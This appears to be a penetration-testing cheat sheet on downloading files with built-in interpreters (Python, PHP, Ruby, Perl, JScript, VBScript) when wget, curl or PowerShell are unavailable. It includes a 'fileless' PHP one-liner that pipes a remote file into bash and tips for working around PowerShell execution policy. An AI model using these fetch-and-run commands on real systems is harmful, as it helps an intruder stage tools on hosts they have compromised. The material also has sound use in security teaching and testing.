---
title: File Transfers with Code
tags: [file-transfer, python, php, ruby, perl, javascript, windows, linux]
---

# File Transfers with Code
> Use built-in language interpreters to download files when standard tools (wget, curl, PowerShell) aren't available.

---

## Python

```bash
# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OutFile>")'

# Python 2.7
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OutFile>")'
```

---

## PHP

```bash
# file_get_contents + file_put_contents
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OutFile>",$file);'

# fopen streaming (for large files)
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OutFile>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless — pipe to bash
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---

## Ruby

```bash
ruby -e 'require "net/http"; File.write("<OutFile>", Net::HTTP.get(URI.parse("<URL>")))'
```

---

## Perl

```bash
perl -e 'use LWP::Simple; getstore("<URL>", "<OutFile>");'
```

---

## JavaScript (Windows — cscript.exe)

Create a file named `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```powershell
# Run with cscript
cscript.exe /nologo wget.js <URL> <OutFile>
```

---

## VBScript (Windows — cscript.exe)

Create a file named `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```powershell
# Run with cscript
cscript.exe /nologo wget.vbs <URL> <OutFile>
```

!!! tip
    JavaScript and VBScript methods are useful on older Windows systems or restricted environments where PowerShell execution policy blocks scripts.
